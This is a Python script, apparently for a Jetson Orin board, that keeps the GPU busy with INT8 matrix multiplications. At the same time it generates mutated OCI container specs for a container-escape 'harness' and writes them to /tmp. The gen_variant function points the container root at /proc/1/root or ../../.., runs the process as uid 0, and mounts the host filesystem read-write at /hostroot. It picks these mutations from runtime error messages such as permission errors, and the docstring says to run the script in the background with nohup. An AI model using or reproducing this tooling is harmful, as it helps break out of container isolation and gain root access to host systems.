#!/usr/bin/env python3
"""
Small side mission for Orin (Jetson Orin AGX/NX etc).
Uses Orin's strength in INT8 / Tensor Core heavy workloads.
- Persistent high-rate INT8 matmul / GEMM burn to load the iGPU or dGPU.
- Error-driven variant generator (same as main hacker skill).
- Fast "fitness" scoring of variants using int8 ops (bytes of JSON -> small matmul "score").
- Periodically dumps fresh variants to /tmp/orin_variants.jsonl that can be pulled and fed into main harness.

Intended to run on Orin alongside the main V100 CDI volume.
Run:
  nohup python3 orin_int8_side.py > /tmp/orin_side.log 2>&1 &
Fits "int8 math help" for the AI-assisted mutation part.
"""

import os
import time
import json
import random
import hashlib

print(f"[ORIN-SIDE pid={os.getpid()}] Starting INT8 side mission on Orin")

# Try cupy int8 first (best for Jetson Orin)
USE_CUPY = False
try:
    import cupy as cp
    # Orin loves INT8
    a = cp.random.randint(-128, 127, (2048, 2048), dtype=cp.int8)
    b = cp.random.randint(-128, 127, (2048, 2048), dtype=cp.int8)
    USE_CUPY = True
    print("[ORIN-SIDE] CuPy INT8 ready, starting heavy loop")
except Exception as e:
    print("[ORIN-SIDE] CuPy INT8 not avail, falling back to numpy int8 sim:", e)
    import numpy as np
    a = np.random.randint(-128, 127, (1024, 1024), dtype=np.int8)
    b = np.random.randint(-128, 127, (1024, 1024), dtype=np.int8)

ERROR_HINTS = [
    "failed to determined container root",
    "failed to open OCI spec file",
    "failed to load container state",
    "Ignoring permission error",
    "No paths specified",
    "EPERM",
    "EOF",
]

ROOT_IDEAS = [
    "/", "/proc/1/root", ".", "../../..", "/proc/1/root/..",
    "/proc/self/root", "/proc/1/root/etc", "../../../"
]

def int8_score_variant(spec_dict: dict) -> int:
    """Use int8 matmul-ish as a cheap 'fitness' for a variant.
    Treat json bytes as int8 vector, do small 'matmul' score.
    """
    raw = json.dumps(spec_dict, separators=(",", ":")).encode("utf-8")[:256]
    vec = [ (b - 128) for b in raw ] + [0] * (256 - len(raw))
    # small fake int8 "matmul" dot-ish
    s = 0
    for i in range(0, min(64, len(vec)-1), 2):
        s += (vec[i] * vec[i+1]) // 4
    return abs(s) % 10000

def gen_variant(hint: str = "general") -> dict:
    root = random.choice(ROOT_IDEAS)
    if "root" in hint or "container" in hint:
        root = random.choice(["/proc/1/root", "../../..", ".", "/proc/self/root"])
    spec = {
        "ociVersion": "1.0.0",
        "root": {"path": root},
        "process": {"user": {"uid": 0, "gid": 0}}
    }
    if "permission" in hint.lower() or "Ignoring" in hint:
        spec["mounts"] = [{"destination": "/hostroot", "source": "/", "options": ["rbind", "rw"]}]
    if random.random() < 0.4:
        spec["annotations"] = {"orin-int8": "mut"}
    return spec

def main():
    iters = 0
    variant_out = "/tmp/orin_variants.jsonl"
    open(variant_out, "w").close()  # truncate

    while True:
        # Heavy INT8 load
        if USE_CUPY:
            c = cp.matmul(a, b)
            cp.cuda.Device().synchronize()
            # occasional extra int8 work
            if iters % 7 == 0:
                d = cp.multiply(a.astype(cp.int32), 3).astype(cp.int8)
                cp.cuda.Device().synchronize()
        else:
            c = a.astype("int16") @ b.astype("int16")
            if iters % 7 == 0:
                _ = (a * 3).astype("int8")

        iters += 1

        # Every N iters, emit new variants (AI-assisted style)
        if iters % 50 == 0:
            hints = random.sample(ERROR_HINTS, k=2)
            for h in hints:
                v = gen_variant(h)
                score = int8_score_variant(v)
                rec = {"ts": time.time(), "hint": h, "variant": v, "int8_score": score}
                with open(variant_out, "a") as f:
                    f.write(json.dumps(rec) + "\n")
            print(f"[ORIN] {iters} int8 iters, emitted variants (score sample ~{score})")

        if iters % 200 == 0:
            print(f"[ORIN-SIDE] {iters} heavy INT8 matmuls / burns complete")

        time.sleep(0.001)  # tight loop for load

if __name__ == "__main__":
    main()
